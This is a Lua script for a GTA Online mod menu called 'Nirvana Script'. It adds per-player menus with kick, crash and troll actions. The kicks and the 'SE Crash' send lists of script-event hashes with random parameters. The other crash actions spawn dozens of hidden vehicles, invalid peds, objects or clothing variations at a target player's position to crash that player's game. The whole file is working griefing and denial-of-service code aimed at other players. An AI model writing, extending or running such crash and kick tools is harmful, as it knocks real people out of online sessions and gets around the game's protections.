util.require_natives("natives-1640181023")

KickScriptEvent = {
    677240627,
    -1061742115,
    -861589405,
    -1229242825,
    -1716929373,
    470437478,
    -759876757,
    846342319,
    1498409190,
    -903578754,
    990606644,
    436475575,
    33622745,
    -1004984903,
    1632257529,
    935153350,
    449084041,
    -1092487927,
    -1464683798,
    1340710022,
    -510220924,
    -329059601,
    -368423380,
    -1878337912,
    -300035648,
    -1436897407,
    -195247709,
    -1233352813,
    -1422084449,
    1132878564,
    -1290632586,
    -1307162628,
    1903866949,
    -68354216,
    127278285,
    744614232,
    999206981,
    -486420527,
    -1981816062,
    927169576,
    578856274,
    1171686015,
    -210719602,
    613598296,
    -1895406474,
    -727072915,
    1582169196,
    911121765,
    -350734161,
    1572255940,
    69874647,
    1294995624,
    354106306,
    802133775,
    389634423,
    -1629430060,
    924535804,
    -1782442696,
    -2091335671,
    252711156,
    104546633,
    -621812018,
    -65587051,
    1116398805,
    1514515570,
    -972519224,
    2100148373,
    -1975131531,
    -1399847686,
    -154821928,
    -143116395,
    -488349268,
    -145306724,
    -439785231,
    296518236,
    911179316,
    -317318371,
    665075435,
    -1872092614,
    125492983,
    -10584126,
    -1766066400,
    -1030012311,
    -1367466623,
    -857055591,
    -1026787486,
    -1676389891,
    -1402943861,
    -980869764,
    -522517025,
    -660428494,
    194348342,
    -1672632969,
    637990725,
    -39307858,
    1915516637,
    -292927152,
    -1321808667,
    193360559,
    1474930020,
    1216755327,
    1219394502,
    -427680601,
    1673015603,
    514531643,
    -371781708,
    -1686096923,
    -1431495660,
    24150149,
    -156144612,
    -17252370,
    -614457627,
    1246667869,
    -1813921147,
    1375585828,
    892426264,
    1695733171,
    756750404,
    -120329143,
    1897451017,
    -1392472400,
    262065148,
    1736319472,
    1856470832,
    -1826883729,
    1226685750,
    726324704,
    -931193632,
    1786176568,
    -1312879439,
    -594101085,
    2125250083,
    -1537719898,
    -695930999,
    537760938,
    94424757,
    1514330666,
    -1057714896,
    1327000392,
    -1981664248,
    745513842,
    1310375266,
    -1892343528,
    -835116031,
    -1335321822,
    -1208585385,
    -586564007,
    725663716,
    -1028896607,
    1887715261,
    -569621836,
    1494472464,
    1560273502,
    1213478059,
    -1948352103,
    -123017678,
    -518094689,
    1765370359,
    -1846290480,
    747270864,
    -990958325,
    792605141,
    -2065406127,
    1293356309,
    2055309431,
    959741220,
    948476291,
    1667912884,
    973384593,
    1322653555,
    1983831220,
    2035029994,
    1685428989,
    -1881985419,
    -2084766469,
    -1581374996,
    -1027219536,
    1456985457,
    -965422298,
    -374648715,
    -1593328306,
    -399817245,
    605734688,
    1618540540,
    145350701,
    -102469555,
    -1245088727,
    -206137320,
    -1991317864,
    -2085853000,
    -2085033931,
    -1702264142,
    1999649849,
    -319251612,
    916721383,
    1193641249,
    843683007,
    2140747899,
    1861592619,
    -323225852,
    -823334279,
    -242781845,
    1716771531,
    -1013653994,
    -1617444053,
    -694031333,
    1658337260,
    1189947075,
    2002459655,
    1859708311,
    -1887269275,
    985284033,
    287021706,
    248967238,
    1890624026,
    1763436095,
    -1020081720,
    -1071325787,
    1836137561,
    1800955959,
    1890277845,
    657959395,
    1644680339,
    1759776242,
    -2042927980,
    -1195677176,
    -1470529744,
    -555177382,
    1711742823,
    -1483860044,
    -480773441,
    -945112313,
    1181272075,
    -160010589,
    1989580036,
    470899337,
    1481806247,
    -225522261,
    338377244,
    -1141953949,
    373340885,
    1445703181,
    1767220965,
    -1069875050,
    -686546819,
    1138543926,
    730048565,
    -330288802,
    357740145,
    367823892,
    -1093866525,
    -581037897,
    -1205085020,
    1195953488,
    -290218924,
    1902624891,
    -1211206539,
    -1308840134,
    -446275082,
    1695663635,
    -540733954,
    555805165,
    -943413695,
    657090120,
    -764524031,
    -780184517,
    -211216577,
    703680251,
    -890540460,
    -994045023,
    -1540254019,
    907247199,
    1366634967,
    -636728804,
    -227800145,
    -1598754565,
    844746317,
    1242938933,
    150518680,
    922450413,
    526046459,
    -1277554447,
    894434968,
    -1402098061,
    -1767058336,
    957803617,
    522189882,
    1408934068,
    25093741,
    100413140,
    1539285108,
    -2094168155,
    1989086656,
    1374270767,
    -442909224,
    -402477535,
    110511020,
    -1055758293,
    -83272757,
    -33103987,
    -465916800,
    -1787741241,
    -233163280,
    394024783,
    -422308928,
    717371311,
    -615565347,
    858081640,
    -1012245580,
    -1272736485,
    707492193,
    957803617,
    -1159204706,
    -1125867895,
    -836299692,
    -1717268320,
    -375285626,
    -520925154,
    -986621843,
    -1501164935,
    -1013679841,
    -737858645,
    1228916411,
    21248229,
    -533358540,
    -2019427315,
    1579609637,
    -1909265597,
    1033173948,
    1000228518,
    -1605670950,
    434912098,
    995853474,
    -1536413542,
    1778752151,
    }

function CreateVehicle(Hash, Pos, Heading, Invincible)
    STREAMING.REQUEST_MODEL(Hash)
    while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
    local SpawnedVehicle = entities.create_vehicle(Hash, Pos, Heading)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
    if Invincible then
        ENTITY.SET_ENTITY_INVINCIBLE(SpawnedVehicle, true)
    end
    return SpawnedVehicle
end

function CreatePed(index, Hash, Pos, Heading)
    STREAMING.REQUEST_MODEL(Hash)
    while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
    local SpawnedVehicle = entities.create_ped(index, Hash, Pos, Heading)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
    return SpawnedVehicle
end

function CreateObject(Hash, Pos, static)
    STREAMING.REQUEST_MODEL(Hash)
    while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
    local SpawnedVehicle = entities.create_object(Hash, Pos)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
    if static then
        ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicle, true)
    end
    return SpawnedVehicle
end

util.keep_running()

MainMenu = menu.my_root()

menu.action(MainMenu, "Ruiner Crash", {"vehparachute"}, "Global Crash", function ()
    local SelfPlayerPed = PLAYER.PLAYER_PED_ID()
    local PreviousPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
    for i = 1, 20 do
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
        local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
        PED.SET_PED_INTO_VEHICLE(SelfPlayerPed, Ruiner2, -1)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 1000, false, true, true)
        util.yield(200)
        VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, util.joaat("prop_beach_parasol_05"))
        VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
        util.yield(200)
        entities.delete_by_handle(Ruiner2)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
end)

menu.action(MainMenu, "Umbrella Crash", {"umbrella"}, "Crash another player's game", function()
    local SelfPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
    local PreviousPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
    for n = 0 , 3 do
        local object_hash = util.joaat("prop_logpile_06b")
        STREAMING.REQUEST_MODEL(object_hash)
          while not STREAMING.HAS_MODEL_LOADED(object_hash) do
           util.yield()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0,0,500, false, true, true)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0 , 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
        end
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)

        local object_hash2 = util.joaat("prop_beach_parasol_03")
        STREAMING.REQUEST_MODEL(object_hash2)
          while not STREAMING.HAS_MODEL_LOADED(object_hash2) do
           util.yield()
        end
        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash2)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0,0,500, 0, 0, 1)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 1000, false)
        util.yield(1000)
        for i = 0 , 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
        end
        util.yield(1000)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
end)

GenerateFeatures = function(PlayerID)
    PlayerMainMenu = menu.list(menu.player_root(PlayerID), "Nirvana Script", {}, "", function(); end)

    KickMenu = menu.list(PlayerMainMenu, "Kicks", {}, "", function(); end)
    menu.action(KickMenu, "SE Kick", {}, "Kicks the player using script events", function()
        util.trigger_script_event(1 << PlayerID, { 163598572, PlayerID, 0, 0, 0, 0, 0, 0 })
        util.trigger_script_event(1 << PlayerID, { 1757755807, PlayerID , 62, 0, 0, 0, 0, 0 })
        for i, v in ipairs(KickScriptEvent) do 
            par1 = math.random(-100000, 99999999)
            par2 = math.random(-4827432, 3231229)
            par3 = math.random(46190868, 999999999)
            par4 = math.random(-133223, 42746729)
            par5 = math.random(-999999999, 428747628)
            util.trigger_script_event(1 << PlayerID, {v, PlayerID, par1, par2, par3, par4, par5})
            util.yield(10)
        end
    end)

    CrashMenu = menu.list(PlayerMainMenu, "Crashes", {}, "", function(); end)

    menu.action(CrashMenu, "SE Crash", {}, "Crash another player's game using script events", function()
        util.trigger_script_event(1 << PlayerID, { 962740265, PlayerID , 115831, 9999449 })
    end)

    menu.action(CrashMenu, "Invalid Entity Crash", {}, "Crash another player's game using invalid entities", function()
        menu.trigger_commands("anticrashcam on")
		local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
		local SpawnPed_slod_small_quadped = CreatePed(26, util.joaat("slod_small_quadped"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
		local SpawnPed_slod_large_quadped = CreatePed(26, util.joaat("slod_large_quadped"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
		local SpawnPed_slod_human = CreatePed(26, util.joaat("slod_human"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        util.yield(2000)
        entities.delete_by_handle(SpawnPed_slod_small_quadped)
        entities.delete_by_handle(SpawnPed_slod_large_quadped)
        entities.delete_by_handle(SpawnPed_slod_human)
        menu.trigger_commands("anticrashcam off")
    end)

    menu.action(CrashMenu, "Invalid object crashes", {}, "Crash another player's game using invalid object crashes", function()
        menu.trigger_commands("anticrashcam on")
		local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local Object_pizza1 = CreateObject(3613262246, TargetPlayerPos)
        local Object_pizza2 = CreateObject(2155335200, TargetPlayerPos)
        local Object_pizza3 = CreateObject(3026699584, TargetPlayerPos)
        local Object_pizza4 = CreateObject(-1348598835, TargetPlayerPos)
        for i = 0, 100 do 
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza1, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza3, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza4, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
            util.yield(10)
        end
        util.yield(2000)
        entities.delete_by_handle(Object_pizza1)
        entities.delete_by_handle(Object_pizza2)
        entities.delete_by_handle(Object_pizza3)
        entities.delete_by_handle(Object_pizza4)
        menu.trigger_commands("anticrashcam off")
    end)

    menu.action(CrashMenu, "Hunter Crash", {}, "Crash another player's game using the Hunter Crash", function()
        menu.trigger_commands("anticrashcam on")
		local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
		local SpawnedVehicleList = { };
		for i = 1, 60 do
			local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
            SpawnedVehicleList[i] = CreateVehicle(util.joaat("hunter"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
			ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicleList[i], true)
			ENTITY.SET_ENTITY_VISIBLE(SpawnedVehicleList[i], false, 0)
            util.yield(50)
        end
        util.yield(5000)
        for i = 1, 60 do
            entities.delete_by_handle(SpawnedVehicleList[i])
        end
        menu.trigger_commands("anticrashcam off")
    end)


    menu.action(CrashMenu, "Missile Car Crash", {}, "Crash another player's game using missile car crash", function()
        menu.trigger_commands("anticrashcam on")
		local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
		SpawnedVehicleList = { };
		for i = 1, 80 do
			local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
            SpawnedVehicleList[i] = CreateVehicle(util.joaat("chernobog"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
			ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicleList[i], true)
			ENTITY.SET_ENTITY_VISIBLE(SpawnedVehicleList[i], false, 0)
            util.yield(50)
        end
        util.yield(5000)
        for i = 1, 80 do
            entities.delete_by_handle(SpawnedVehicleList[i])
        end
        menu.trigger_commands("anticrashcam off")
    end)

    menu.action(CrashMenu, "Missile Car Crash V2", {}, "Crash another player's game using missile car crash v2", function()
        menu.trigger_commands("anticrashcam on")

		local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        TargetPlayerPos.y = TargetPlayerPos.y + 1050
		SpawnedVehicleList1 = { };
		for i = 1, 60 do
			local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
            SpawnedVehicleList1[i] = CreateVehicle(util.joaat("chernobog"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
			ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicleList1[i], true)
			ENTITY.SET_ENTITY_VISIBLE(SpawnedVehicleList1[i], false, 0)
            util.yield(50)
        end
        util.yield(2000)
        for i = 1, 60 do
            entities.delete_by_handle(SpawnedVehicleList1[i])
        end

        util.yield(1000)
        SpawnedVehicleList2 = { };
		for i = 1, 50 do
			local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
            SpawnedVehicleList2[i] = CreateVehicle(util.joaat("chernobog"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
			ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicleList2[i], true)
			ENTITY.SET_ENTITY_VISIBLE(SpawnedVehicleList2[i], false, 0)
            util.yield(50)
        end
        util.yield(2000)
        for i = 1, 50 do
            entities.delete_by_handle(SpawnedVehicleList2[i])
        end

        menu.trigger_commands("anticrashcam off")
    end)

    menu.action(CrashMenu, "Vader Crash", {}, "Crash another player's game using vader crash", function()
        menu.trigger_commands("anticrashcam on")
		local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local SpawnPed_Wade = { }
        for i = 1, 60 do
            SpawnPed_Wade[i] = CreatePed(26, util.joaat("ig_wade"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
            util.yield(1)
        end
        util.yield(5000)
        for i = 1, 60 do
            entities.delete_by_handle(SpawnPed_Wade[i])
        end
        menu.trigger_commands("anticrashcam off")
    end)

    menu.action(CrashMenu, "Invalid Clothes Crash", {}, "Crash another player's game using invalid clothes crash", function()
        menu.trigger_commands("anticrashcam on")
		local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local SelfPlayerPed = PLAYER.PLAYER_PED_ID();
        local Spawned_Mike = CreatePed(26, util.joaat("player_zero"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        for i = 0, 500 do
            PED.SET_PED_COMPONENT_VARIATION(Spawned_Mike, 0, 0, math.random(0, 10), 0)
			ENTITY.SET_ENTITY_COORDS(Spawned_Mike, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, true, false, false, true);
            util.yield(10)
        end
        entities.delete_by_handle(Spawned_Mike)
        menu.trigger_commands("anticrashcam off")
    end)

    menu.action(CrashMenu, "Trailer Crash", {}, "Crash another player's game using", function()
		local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
		SpawnedDune1 = CreateVehicle(util.joaat("dune"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
		ENTITY.FREEZE_ENTITY_POSITION(SpawnedDune1, true)
		SpawnedDune2 = CreateVehicle(util.joaat("dune"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
		ENTITY.FREEZE_ENTITY_POSITION(SpawnedDune2, true)
		SpawnedBarracks1 = CreateVehicle(util.joaat("barracks"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
		ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks1, true)
		SpawnedBarracks2 = CreateVehicle(util.joaat("barracks"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
		ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks2, true)
		SpawnedTowtruck = CreateVehicle(util.joaat("towtruck2"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
		ENTITY.FREEZE_ENTITY_POSITION(SpawnedTowtruck, true)
		SpawnedBarracks31 = CreateVehicle(util.joaat("barracks3"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
		ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks31, true)
		SpawnedBarracks32 = CreateVehicle(util.joaat("barracks3"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
		ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks32, true)

		ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks31, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
		ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks32, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
		ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks1, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
		ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks2, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
		ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedDune1, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
		ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedDune2, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
        for i = 0, 100 do 
            TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SpawnedTowtruck, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
            util.yield(10)
        end
        util.yield(2000)
        entities.delete_by_handle(SpawnedTowtruck)
        entities.delete_by_handle(SpawnedDune1)
        entities.delete_by_handle(SpawnedDune2)
        entities.delete_by_handle(SpawnedBarracks31)
        entities.delete_by_handle(SpawnedBarracks32)
        entities.delete_by_handle(SpawnedBarracks1)
        entities.delete_by_handle(SpawnedBarracks2)
    end)

    menu.action(CrashMenu, "Onigiri Crash", {}, "Crash another player's game using", function()
        menu.trigger_commands("anticrashcam on")
		local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local SelfPlayerPed = PLAYER.PLAYER_PED_ID()
        local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
        local Spawned_tr3 = CreateVehicle(util.joaat("tr3"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(Spawned_tr3, SelfPlayerPed, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(Spawned_tr3, false, 0)
        local Spawned_chernobog = CreateVehicle(util.joaat("chernobog"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(Spawned_chernobog, SelfPlayerPed, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(Spawned_chernobog, false, 0)
        local Spawned_avenger = CreateVehicle(util.joaat("avenger"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(Spawned_avenger, SelfPlayerPed, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
		ENTITY.SET_ENTITY_VISIBLE(Spawned_avenger, false, 0)
        for i = 0, 100 do
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
            ENTITY.SET_ENTITY_COORDS(SelfPlayerPed, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, true, false, false)
            util.yield(10 * math.random())
            ENTITY.SET_ENTITY_COORDS(SelfPlayerPed, SelfPlayerPos.x, SelfPlayerPos.y, SelfPlayerPos.z, true, false, false)
            util.yield(10 * math.random())
        end
        menu.trigger_commands("anticrashcam off")
    end)

    SpoofingMenu = menu.list(PlayerMainMenu, "Troll", {}, "", function(); end)
    menu.action(SpoofingMenu, "Turn off invincibility godmode", {}, "", function()
        util.trigger_script_event(1 << PlayerID, { 801199324, PlayerID, 869796886, 0 })
    end)
end

local InitialPlayersList = players.list(true, true, true)
for i=1, #InitialPlayersList do
	GenerateFeatures(InitialPlayersList[i]) 
end

players.on_join(GenerateFeatures)